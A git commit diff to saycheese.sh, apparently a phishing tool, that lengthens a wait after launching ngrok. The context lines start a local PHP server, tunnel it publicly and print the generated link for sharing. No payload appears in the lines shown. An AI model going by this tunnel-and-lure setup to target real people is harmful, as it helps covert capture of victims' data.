2871efa25eea7a5458eb4ffd78551d5167ea924a
ramamajhi14 <ramamajhi14@gmail.com>
2019-07-08 19:59:47 +0530

    sleep increase

--- saycheese.sh
+++ saycheese.sh
@@ -169,7 +169,7 @@ php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
-sleep 10
+sleep 25
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;33m %s\e[0m\n" $link
